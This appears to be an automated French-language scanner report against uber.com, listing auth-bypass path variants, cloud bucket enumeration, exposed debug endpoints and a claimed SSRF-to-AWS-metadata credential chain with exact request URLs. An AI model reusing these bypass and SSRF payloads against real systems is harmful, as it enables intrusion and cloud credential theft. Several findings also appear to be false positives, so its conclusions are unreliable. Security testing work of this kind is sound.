+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/internal%2f
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/internal%2f
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/internal%2F/
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/internal%2F/
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/;/internal
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/;/internal
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com///internal
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com///internal
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/internal..;/
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/internal..;/
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/internal?id=1
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/internal?id=1
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/intｅrnａl
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/intｅrnａl
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/Admin
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/Admin
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/%ef%bc%8finternal
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/%ef%bc%8finternal
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/internal​
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/internal​
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/internal;/
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/internal;/
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [HIGH]  [HIGH] Auth Bypass via path variant
+       Module: vulns/auth_bypass
+       URL:    https://www.uber.com/v1/internal
+       Desc:   Contournement 403 → 200 via variante de chemin
+       Evid:   Original: https://www.uber.com/internal | Bypass: https://www.uber.com/v1/internal
+       CWE:    CWE-284
+       Fix:    Normaliser les chemins avant validation des ACL. Appliquer la normalisation Unicode (NFC/NFKC) avant le contrôle d'accès.
+
+  [i]     [INFO] JWT — Endpoint auth détecté sans token observable (/login)
+       Module: vulns/jwt
+       URL:    https://uber.com/login
+       Desc:   Un endpoint d'authentification a été détecté à `/login` mais aucun JWT n'a pu être extrait automatiquement. Une inspection manuelle est recommandée.
+       Evid:   HTTP 200 sur https://uber.com/login
+       CWE:    CWE-287
+       Fix:    Vérifier manuellement la gestion des tokens JWT sur cet endpoint.
+
+  [i]     [INFO] S3 Bucket existant (accès refusé) — uber-data
+       Module: recon/s3_enum
+       URL:    https://uber-data.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-data` existe (HTTP 403) mais l'accès public est restreint. Bucket lié au domaine `uber.com` — peut être utile pour recon.
+       Evid:   HTTP 403 | Body: <?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>PMGFP9P4ZX0HQB9S</RequestId><HostId>SbpGW2cR0xh92T5VF3QAGuADwVSKMNMey
+       CWE:    CWE-732
+       Fix:    Vérifier que le bucket ne contient pas de données sensibles accessibles via signed URLs exposées.
+
+  [i]     [INFO] GCS Bucket existant (accès refusé) — uber-data
+       Module: recon/s3_enum
+       URL:    https://storage.googleapis.com/uber-data/
+       Desc:   Bucket GCS `uber-data` détecté (403) — lié au domaine uber.com
+       Evid:   HTTP 403 | https://storage.googleapis.com/uber-data/
+       CWE:    CWE-732
+       Fix:    Auditer les IAM bindings du bucket.
+
+  [i]     [INFO] S3 Bucket existant (accès refusé) — uber-prod
+       Module: recon/s3_enum
+       URL:    https://uber-prod.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-prod` existe (HTTP 403) mais l'accès public est restreint. Bucket lié au domaine `uber.com` — peut être utile pour recon.
+       Evid:   HTTP 403 | Body: <?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>PMG6S7BKWF1FCSG5</RequestId><HostId>7rSd2MCUMimRtFZp2reHenAZJylgSckP6
+       CWE:    CWE-732
+       Fix:    Vérifier que le bucket ne contient pas de données sensibles accessibles via signed URLs exposées.
+
+  [i]     [INFO] S3 Bucket existant (accès refusé) — uber-logs
+       Module: recon/s3_enum
+       URL:    https://uber-logs.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-logs` existe (HTTP 403) mais l'accès public est restreint. Bucket lié au domaine `uber.com` — peut être utile pour recon.
+       Evid:   HTTP 403 | Body: <?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>6143AD7YQCBMFVJK</RequestId><HostId>1moqyATh6MuC6w+UwH0xrCPqJVIBK0OYR
+       CWE:    CWE-732
+       Fix:    Vérifier que le bucket ne contient pas de données sensibles accessibles via signed URLs exposées.
+
+  [i]     [INFO] S3 Bucket existant (accès refusé) — uber-assets
+       Module: recon/s3_enum
+       URL:    https://uber-assets.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-assets` existe (HTTP 403) mais l'accès public est restreint. Bucket lié au domaine `uber.com` — peut être utile pour recon.
+       Evid:   HTTP 403 | Body: <?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>PMGE180FRVNE32MZ</RequestId><HostId>kzIQEoTFRfRtZqrraq1XphWey5satDXGu
+       CWE:    CWE-732
+       Fix:    Vérifier que le bucket ne contient pas de données sensibles accessibles via signed URLs exposées.
+
+  [i]     [INFO] S3 Bucket existant (accès refusé) — uber-images
+       Module: recon/s3_enum
+       URL:    https://uber-images.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-images` existe (HTTP 403) mais l'accès public est restreint. Bucket lié au domaine `uber.com` — peut être utile pour recon.
+       Evid:   HTTP 403 | Body: <?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>PMG71VXNNXTREV6A</RequestId><HostId>9ovvEg7hww2qn2+cs8/0ueffJLX1dO/c7
+       CWE:    CWE-732
+       Fix:    Vérifier que le bucket ne contient pas de données sensibles accessibles via signed URLs exposées.
+
+  [i]     [INFO] GCS Bucket existant (accès refusé) — uber-storage
+       Module: recon/s3_enum
+       URL:    https://storage.googleapis.com/uber-storage/
+       Desc:   Bucket GCS `uber-storage` détecté (403) — lié au domaine uber.com
+       Evid:   HTTP 403 | https://storage.googleapis.com/uber-storage/
+       CWE:    CWE-732
+       Fix:    Auditer les IAM bindings du bucket.
+
+  [i]     [INFO] S3 Bucket existant (accès refusé) — uber-static
+       Module: recon/s3_enum
+       URL:    https://uber-static.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-static` existe (HTTP 403) mais l'accès public est restreint. Bucket lié au domaine `uber.com` — peut être utile pour recon.
+       Evid:   HTTP 403 | Body: <?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>CMF512S7EV3MXQ5Q</RequestId><HostId>UKw5/e/AVyy/oygR6SV/bjnssAXY7fCxu
+       CWE:    CWE-732
+       Fix:    Vérifier que le bucket ne contient pas de données sensibles accessibles via signed URLs exposées.
+
+  [i]     [INFO] S3 Bucket existant (accès refusé) — uber-staging
+       Module: recon/s3_enum
+       URL:    https://uber-staging.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-staging` existe (HTTP 403) mais l'accès public est restreint. Bucket lié au domaine `uber.com` — peut être utile pour recon.
+       Evid:   HTTP 403 | Body: <?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>1625TCV8VM1JWKNR</RequestId><HostId>YvUDNlxnrHzG/416K7y62ZGg/luw8BYHW
+       CWE:    CWE-732
+       Fix:    Vérifier que le bucket ne contient pas de données sensibles accessibles via signed URLs exposées.
+
+  [i]     [INFO] GCS Bucket existant (accès refusé) — uber-staging
+       Module: recon/s3_enum
+       URL:    https://storage.googleapis.com/uber-staging/
+       Desc:   Bucket GCS `uber-staging` détecté (403) — lié au domaine uber.com
+       Evid:   HTTP 403 | https://storage.googleapis.com/uber-staging/
+       CWE:    CWE-732
+       Fix:    Auditer les IAM bindings du bucket.
+
+  [i]     [INFO] S3 Bucket existant (accès refusé) — backup-uber
+       Module: recon/s3_enum
+       URL:    https://backup-uber.s3.amazonaws.com/
+       Desc:   Le bucket S3 `backup-uber` existe (HTTP 403) mais l'accès public est restreint. Bucket lié au domaine `uber.com` — peut être utile pour recon.
+       Evid:   HTTP 403 | Body: <?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>BV754SSQC8B4HNC2</RequestId><HostId>hP7RW4T1zOfJ16CExknjrtP2KQfsa7L/S
+       CWE:    CWE-732
+       Fix:    Vérifier que le bucket ne contient pas de données sensibles accessibles via signed URLs exposées.
+
+  [i]     [INFO] S3 Bucket existant (accès refusé) — uber
+       Module: recon/s3_enum
+       URL:    https://uber.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber` existe (HTTP 403) mais l'accès public est restreint. Bucket lié au domaine `uber.com` — peut être utile pour recon.
+       Evid:   HTTP 403 | Body: <?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>WBD6TBGZ9AFDCDQ2</RequestId><HostId>x/R6yXcymwwHUIF8W/7hpZ3CdmYRBOWjP
+       CWE:    CWE-732
+       Fix:    Vérifier que le bucket ne contient pas de données sensibles accessibles via signed URLs exposées.
+
+  [i]     [INFO] GCS Bucket existant (accès refusé) — uber
+       Module: recon/s3_enum
+       URL:    https://storage.googleapis.com/uber/
+       Desc:   Bucket GCS `uber` détecté (403) — lié au domaine uber.com
+       Evid:   HTTP 403 | https://storage.googleapis.com/uber/
+       CWE:    CWE-732
+       Fix:    Auditer les IAM bindings du bucket.
+
+  [i]     [INFO] GCS Bucket existant (accès refusé) — uber-cdn
+       Module: recon/s3_enum
+       URL:    https://storage.googleapis.com/uber-cdn/
+       Desc:   Bucket GCS `uber-cdn` détecté (403) — lié au domaine uber.com
+       Evid:   HTTP 403 | https://storage.googleapis.com/uber-cdn/
+       CWE:    CWE-732
+       Fix:    Auditer les IAM bindings du bucket.
+
+  [i]     [INFO] S3 Bucket existant (accès refusé) — uber-files
+       Module: recon/s3_enum
+       URL:    https://uber-files.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-files` existe (HTTP 403) mais l'accès public est restreint. Bucket lié au domaine `uber.com` — peut être utile pour recon.
+       Evid:   HTTP 403 | Body: <?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>P3SBBSCCK6X6947K</RequestId><HostId>tfmuDGDIZinRpOtOrvFFvbxrvCVS/aGTc
+       CWE:    CWE-732
+       Fix:    Vérifier que le bucket ne contient pas de données sensibles accessibles via signed URLs exposées.
+
+  [i]     [INFO] S3 Bucket existant (accès refusé) — uber-dev
+       Module: recon/s3_enum
+       URL:    https://uber-dev.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-dev` existe (HTTP 403) mais l'accès public est restreint. Bucket lié au domaine `uber.com` — peut être utile pour recon.
+       Evid:   HTTP 403 | Body: <?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>P3S86N2G6V12VVT9</RequestId><HostId>k2yGBfuZoj5k2yt6zeg2ArKmZUeBCs6je
+       CWE:    CWE-732
+       Fix:    Vérifier que le bucket ne contient pas de données sensibles accessibles via signed URLs exposées.
+
+  [i]     [INFO] GCS Bucket existant (accès refusé) — data-uber
+       Module: recon/s3_enum
+       URL:    https://storage.googleapis.com/data-uber/
+       Desc:   Bucket GCS `data-uber` détecté (403) — lié au domaine uber.com
+       Evid:   HTTP 403 | https://storage.googleapis.com/data-uber/
+       CWE:    CWE-732
+       Fix:    Auditer les IAM bindings du bucket.
+
+  [i]     [INFO] S3 Bucket existant (accès refusé) — uber-backup
+       Module: recon/s3_enum
+       URL:    https://uber-backup.s3.amazonaws.com/
+       Desc:   Le bucket S3 `uber-backup` existe (HTTP 403) mais l'accès public est restreint. Bucket lié au domaine `uber.com` — peut être utile pour recon.
+       Evid:   HTTP 403 | Body: <?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>AccessDenied</Code><Message>Access Denied</Message><RequestId>6P1TCY671BSGAVNH</RequestId><HostId>a78s9tIaf51A+KB+u+13cmjxwd0FNPPdC
+       CWE:    CWE-732
+       Fix:    Vérifier que le bucket ne contient pas de données sensibles accessibles via signed URLs exposées.
+
+  [i]     [INFO] Log4Shell — Scan incomplet (canary non configuré)
+       Module: Log4ShellScanner
+       URL:    https://uber.com
+       Desc:   La détection Log4Shell nécessite un canary OOB. Options v5.19 :
+  --oob interactsh                    (auto, recommandé)
+  --log4shell-canary XXXX.oastify.com (legacy)
+Sans canary, ce module ne peut pas confirmer la vuln.
+       Evid:   No OOB backend, no log4shell_canary
+       CWE:    CWE-917
+       Fix:    1. Lancer le scan avec --oob interactsh.
+2. (alt) Déployer un serveur interactsh self-hosted.
+3. (alt) Utiliser Burp Collaborator + --log4shell-canary.
+
+  [MED]   [MEDIUM] API Endpoint non-protégé exposé: /internal/api
+       Module: vulns/api_security
+       URL:    https://uber.com/internal/api
+       Desc:   L'endpoint `/internal/api` est accessible sans authentification (HTTP 200). 
+       Evid:   GET https://uber.com/internal/api → 200 | body[:200]: <!doctype html><html lang="en"><head><meta charset="utf-8" /><link rel="preload" href="https://d3i4yxtzktqr9n.cloudfront.net/botdefense-ext-ui/cli
+       CWE:    CWE-200
+       Fix:    Protéger les endpoints debug/admin par authentification forte. Désactiver ou supprimer les endpoints de debug en production. Implémenter un réseau séparé pour les endpoints d'administration.
+
+  [HIGH]  [HIGH] API Endpoint non-protégé exposé: /debug/api
+       Module: vulns/api_security
+       URL:    https://uber.com/debug/api
+       Desc:   L'endpoint `/debug/api` est accessible sans authentification (HTTP 200). Contient des données sensibles.
+       Evid:   GET https://uber.com/debug/api → 200 | body[:200]: <!doctype html><html lang="en"><head><meta charset="utf-8" /><link rel="preload" href="https://d3i4yxtzktqr9n.cloudfront.net/botdefense-ext-ui/client
+       CWE:    CWE-200
+       Fix:    Protéger les endpoints debug/admin par authentification forte. Désactiver ou supprimer les endpoints de debug en production. Implémenter un réseau séparé pour les endpoints d'administration.
+
+  [HIGH]  [HIGH] API Endpoint non-protégé exposé: /admin/api
+       Module: vulns/api_security
+       URL:    https://uber.com/admin/api
+       Desc:   L'endpoint `/admin/api` est accessible sans authentification (HTTP 200). Contient des données sensibles.
+       Evid:   GET https://uber.com/admin/api → 200 | body[:200]: <!doctype html><html lang="en"><head><meta charset="utf-8" /><link rel="preload" href="https://d3i4yxtzktqr9n.cloudfront.net/botdefense-ext-ui/client
+       CWE:    CWE-200
+       Fix:    Protéger les endpoints debug/admin par authentification forte. Désactiver ou supprimer les endpoints de debug en production. Implémenter un réseau séparé pour les endpoints d'administration.
+
+  [HIGH]  [HIGH] API Endpoint non-protégé exposé: /__debug__
+       Module: vulns/api_security
+       URL:    https://uber.com/__debug__
+       Desc:   L'endpoint `/__debug__` est accessible sans authentification (HTTP 200). Contient des données sensibles.
+       Evid:   GET https://uber.com/__debug__ → 200 | body[:200]: <!doctype html><html lang="en"><head><meta charset="utf-8" /><link rel="preload" href="https://d3i4yxtzktqr9n.cloudfront.net/botdefense-ext-ui/client
+       CWE:    CWE-200
+       Fix:    Protéger les endpoints debug/admin par authentification forte. Désactiver ou supprimer les endpoints de debug en production. Implémenter un réseau séparé pour les endpoints d'administration.
+
+  [MED]   [MEDIUM] API Endpoint non-protégé exposé: /_debug
+       Module: vulns/api_security
+       URL:    https://uber.com/_debug
+       Desc:   L'endpoint `/_debug` est accessible sans authentification (HTTP 200). 
+       Evid:   GET https://uber.com/_debug → 200 | body[:200]: <!doctype html><html lang="en"><head><meta charset="utf-8" /><link rel="preload" href="https://d3i4yxtzktqr9n.cloudfront.net/botdefense-ext-ui/client-ma
+       CWE:    CWE-200
+       Fix:    Protéger les endpoints debug/admin par authentification forte. Désactiver ou supprimer les endpoints de debug en production. Implémenter un réseau séparé pour les endpoints d'administration.
+
+  [HIGH]  [HIGH] API Endpoint non-protégé exposé: /debug
+       Module: vulns/api_security
+       URL:    https://uber.com/debug
+       Desc:   L'endpoint `/debug` est accessible sans authentification (HTTP 200). Contient des données sensibles.
+       Evid:   GET https://uber.com/debug → 200 | body[:200]: <!doctype html><html lang="en"><head><meta charset="utf-8" /><link rel="preload" href="https://d3i4yxtzktqr9n.cloudfront.net/botdefense-ext-ui/client-mai
+       CWE:    CWE-200
+       Fix:    Protéger les endpoints debug/admin par authentification forte. Désactiver ou supprimer les endpoints de debug en production. Implémenter un réseau séparé pour les endpoints d'administration.
+
+  [HIGH]  [HIGH] Field Bypass — ?select=** retourne plus de données
+       Module: vulns/api_security
+       URL:    https://uber.com?select=%2A%2A
+       Desc:   Le paramètre `select=**` retourne 495674B vs 253570B sans le paramètre. Contient des champs sensibles.
+       Evid:   GET https://uber.com?select=%2A%2A → 495674B | sans param: 253570B
+       CWE:    CWE-200
+       Fix:    Implémenter une allowlist des champs retournables. Ne jamais exposer tous les champs d'un modèle par défaut. Valider les params `fields` / `select` contre la liste des champs autorisés.
+
+  ┌─ Smart fuzzing ─────────────────────────────────────────
+
+  [LOW]   [LOW] Forbidden resource: /dashboard
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/dashboard
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 13B
+
+  [LOW]   [LOW] Forbidden resource: /api
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/api
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 150B
+
+  [LOW]   [LOW] Forbidden resource: /api/v1
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/api/v1
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 150B
+
+  [LOW]   [LOW] Forbidden resource: /api/v2
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/api/v2
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 552B
+
+  [LOW]   [LOW] Forbidden resource: /api/v3
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/api/v3
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 150B
+
+  [MED]   [MEDIUM] Server error on path: /graphql
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/graphql
+       Desc:   HTTP 500 — Erreur serveur, potentielle vulnérabilité
+       Evid:   Internal Server Error
+
+  [LOW]   [LOW] Forbidden resource: /api/docs
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/api/docs
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 552B
+
+  [LOW]   [LOW] Forbidden resource: /api/swagger
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/api/swagger
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 150B
+
+  [LOW]   [LOW] Forbidden resource: /swagger
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/swagger
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 13B
+
+  [LOW]   [LOW] Forbidden resource: /api/health
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/api/health
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 150B
+
+  [LOW]   [LOW] Forbidden resource: /debug
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/debug
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 13B
+
+  [LOW]   [LOW] Forbidden resource: /elmah.axd
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/elmah.axd
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 13B
+
+  [LOW]   [LOW] Forbidden resource: /settings.py
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/settings.py
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 13B
+
+  [LOW]   [LOW] Forbidden resource: /bak
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/bak
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 13B
+
+  [LOW]   [LOW] Forbidden resource: /login
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/login
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 13B
+
+  [LOW]   [LOW] Forbidden resource: /oauth2
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/oauth2
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 13B
+
+  [LOW]   [LOW] Forbidden resource: /static
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/static
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 13B
+
+  [LOW]   [LOW] Forbidden resource: /actuator/env
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/actuator/env
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 13B
+
+  [LOW]   [LOW] Forbidden resource: /django-admin
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/django-admin
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 13B
+
+  [LOW]   [LOW] Forbidden resource: /api/v1/docs
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/api/v1/docs
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 150B
+
+  [LOW]   [LOW] Forbidden resource: /api/v2/docs
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/api/v2/docs
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 150B
+
+  [LOW]   [LOW] Forbidden resource: /api/graphql
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/api/graphql
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 552B
+
+  [LOW]   [LOW] Forbidden resource: /pma
+       Module: fuzz/smart_fuzzer
+       URL:    https://www.uber.com/pma
+       Desc:   HTTP 403 — Ressource existe mais accès refusé (potentiel bypass)
+       Evid:   Size: 13B
+
+  ┌─ Correlation (1 chaîne(s) détectée(s)) ─────────────────
+
+  [CRIT]  [CRITICAL] [COMPOSITE] Chaîne SSRF + IMDS → Vol de rôle IAM (privilege escalation cloud)
+       Module: correlation
+       URL:    https://uber.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/
+       Desc:   [CORR-002] Chaîne d'exploitation détectée par corrélation de findings.
+
+Le SSRF atteint l'IMDS AWS (https://uber.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/), permettant de récupérer les credentials IAM temporaires du rôle EC2 attaché. Ces credentials permettent un accès complet aux ressources AWS du compte (S3, RDS, SSM, etc.).
+SSRF→IMDS: SSRF — endpoint /proxy?url= → AWS IAM via IMDS
+       Evid:   [1] SSRF — endpoint /proxy?url= → AWS IAM via IMDS @ https://uber.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/
+[1] SSRF — endpoint /image?url= → AWS IMDSv1 @ https://uber.com/image?url=h
+       CWE:    CWE-918
+       Fix:    Désactiver IMDSv1 immédiatement. Migrer vers IMDSv2 (token requis). Corriger le SSRF. Auditer les permissions IAM du rôle EC2 (principe de moindre privilège).
+
+  ════════════════════════════════════════════════════════════
+  SCAN SUMMARY
+  ════════════════════════════════════════════════════════════
+  Target   : https://uber.com
+  Duration : 658.1s
+  Requests : 1857
+  Findings : 152
+
+  [CRIT]  CRITICAL    ######....  6
+  [HIGH]  HIGH        ###########################  27
+  [MED]   MEDIUM      #######...  7
+  [LOW]   LOW         #######################  23
+  [i]     INFO        #########################################################################################  89
+
+  Errors: 22
+  ════════════════════════════════════════════════════════════
+
+
+  ┌─ Markdown report → uber3.md ────────────────────────────
+
+  [BB] Bug Bounty report saved → uber3.md
+       63 finding(s) | 33 HIGH/CRITICAL
+  [BB] Rapport bug bounty → uber3.md
